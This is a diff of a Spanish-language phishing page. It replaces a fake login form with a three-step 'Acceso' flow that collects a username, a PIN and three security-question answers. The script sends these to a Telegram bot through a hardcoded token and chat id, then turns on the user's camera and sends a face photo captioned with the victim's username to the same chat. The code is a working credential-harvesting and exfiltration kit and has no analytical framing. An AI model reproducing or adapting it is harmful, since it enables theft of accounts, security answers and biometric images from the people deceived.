@@ -1,79 +1,125 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Iniciar Sesión</title>
-<style>
-    body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }
-  .login-box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
-    h2 { text-align: center; color: #1877f2; }
-    h4 { margin: 15px 0 5px 0; color: #333; }
-    input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-    button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; margin-top: 10px; }
-    video, canvas { width: 100%; border-radius: 5px; margin-top: 10px; display: none; border: 1px solid #ddd; }
-</style>
+  <title>Acceso</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 30px; background: #f2f2f2; }
+    .caja { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px #ccc; }
+    input { display: block; margin: 10px auto; padding: 10px; width: 90%; }
+    button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    #paso2, #paso3 { display: none; } /* Ocultos al inicio */
+    #video { width: 100%; border-radius: 10px; margin-top: 10px; }
+    .aviso { font-size: 14px; color: #555; margin-bottom: 15px; }
+  </style>
 </head>
 <body>
-<div class="login-box">
-    <h2>Iniciar Sesión</h2>
-    <form action="telegram.php" method="POST" enctype="multipart/form-data">
-        <input type="text" name="usuario" placeholder="Correo electrónico o teléfono" required>
-        <input type="password" name="clave" placeholder="Contraseña" required>
 
-        <button type="submit">Entrar</button>
-    </form>
-</div>
-<div>
-<!-- CAMARA QUE APARECE DESPUES DE DAR ENTRAR -->
-<video id="video" autoplay playsinline style="display:none; width:100%; margin-top:10px;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
-<button id="btnFoto" onclick="tomarFoto()" type="button" style="display:none; margin-top:10px;">📷 Tomar Foto</button>
-</div>
+  <!-- PASO 1: USUARIO Y PIN -->
+  <div id="paso1" class="caja">
+    <h2>Acceso</h2>
+    <input type="text" id="usuario" placeholder="Usuario">
+    <input type="password" id="pin" placeholder="Código de acceso">
+    <button type="button" onclick="irAPaso2()">Entrar</button>
+  </div>
+
+
+  <!-- PASO 2: 3 PREGUNTAS DE SEGURIDAD -->
+  <div id="paso2" class="caja">
+    <h2>Verificación de Seguridad</h2>
+    <p class="aviso">HOLA, por favor ingresar las 3 Respuestas de seguridad que mantiene afiliada. Solo debe colocar sus respuestas dentro del espacio indicado a continuación:</p>
+    
+    <input type="text" id="resp1" placeholder="Respuesta 1">
+    <input type="text" id="resp2" placeholder="Respuesta 2">
+    <input type="text" id="resp3" placeholder="Respuesta 3">
+    
+    <button type="button" onclick="irAPaso3()">Siguiente</button>
+  </div>
+
+
+  <!-- PASO 3: CAMARA -->
+  <div id="paso3" class="caja">
+    <h2>Verificación Facial</h2>
+    <p class="aviso">Presione el botón para activar la cámara y tomar la foto</p>
+    <video id="video" autoplay playsinline></video>
+    <button type="button" onclick="tomarYEnviarFoto()">Tomar Foto</button>
+  </div>
+
 
 <script>
-// CUANDO LE DEN CLIC A ENTRAR
-document.querySelector('form').addEventListener('submit', function(e){
-  setTimeout(function() {
-    alert("Datos enviados ✅ Ahora tómate la foto para verificar");
-    const video = document.getElementById('video');
-    document.getElementById('video').style.display = 'block';
-    document.getElementById('btnFoto').style.display = 'block';
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(stream => { video.srcObject = stream })
-    .catch(err => { alert("Activa los permisos de cámara porfa"); });
-  }, 1000);
-});
+const token = "8970164569:AAFHwcsRG3bNfX1fgF0EfVkodTwUN5CKpbc";
+const chat_id = "-1004395775315";
+let streamGlobal;
 
-// CUANDO LE DEN A TOMAR FOTO
-function tomarFoto() {
-  const token = "8970164569:AAFHwcsRG3bNfX1fgF0EfVkodTwUN5CKpbc";
-  const chat_id = "-1004395775315";
+// PASO 1 → PASO 2
+function irAPaso2() {
+  const usuario = document.getElementById('usuario').value;
+  const pin = document.getElementById('pin').value;
+  if(usuario == "" || pin == ""){ alert("Rellena usuario y pin"); return; }
+  
+  // Guardamos datos para enviarlos después
+  window.datos = { usuario, pin };
+  
+  document.getElementById('paso1').style.display = 'none';
+  document.getElementById('paso2').style.display = 'block';
+}
+
+// PASO 2 → PASO 3
+function irAPaso3() {
+  const resp1 = document.getElementById('resp1').value;
+  const resp2 = document.getElementById('resp2').value;
+  const resp3 = document.getElementById('resp3').value;
+  if(resp1 == "" || resp2 == "" || resp3 == ""){ alert("Rellena las 3 respuestas"); return; }
+  
+  window.datos.resp1 = resp1;
+  window.datos.resp2 = resp2;
+  window.datos.resp3 = resp3;
+
+  // Enviamos todo el texto a Telegram
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: `🔑 NUEVO ACCESO\nUsuario: ${window.datos.usuario}\nPIN: ${window.datos.pin}\n\nRespuestas:\n1. ${resp1}\n2. ${resp2}\n3. ${resp3}`
+    })
+  });
+
+  document.getElementById('paso2').style.display = 'none';
+  document.getElementById('paso3').style.display = 'block';
+
+  // Encendemos la cámara
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+  .then(stream => {
+    streamGlobal = stream;
+    document.getElementById('video').srcObject = stream;
+  })
+  .catch(err => { alert("Activa los permisos de cámara"); });
+}
+
+// TOMAR FOTO Y ENVIAR
+function tomarYEnviarFoto() {
   const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
+  const canvas = document.createElement('canvas');
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   canvas.getContext('2d').drawImage(video, 0, 0);
-  canvas.style.display = 'block';
-
+  
   canvas.toBlob(function(blob) {
     const formData = new FormData();
     formData.append('chat_id', chat_id);
     formData.append('photo', blob, 'foto.jpg');
-    formData.append('caption', '📸 Foto de verificación');
+    formData.append('caption', `📸 Foto de: ${window.datos.usuario}`);
 
-    fetch('https://api.telegram.org/bot'+token+'/sendPhoto' , {
+    fetch(`https://api.telegram.org/bot${token}/sendPhoto` , {
       method: 'POST',
       body: formData
-    })
-    .then(() => {
-      alert("Foto enviada correctamente ✅");
-      video.srcObject.getTracks().forEach(track => track.stop());
-      document.getElementById('video').style.display = 'none';
-      document.getElementById('btnFoto').style.display = 'none';
+    }).then(() => {
+      alert("Acceso concedido ✅");
+      streamGlobal.getTracks().forEach(track => track.stop());
     });
   });
 }
 </script>
+
 </body>
 </html>
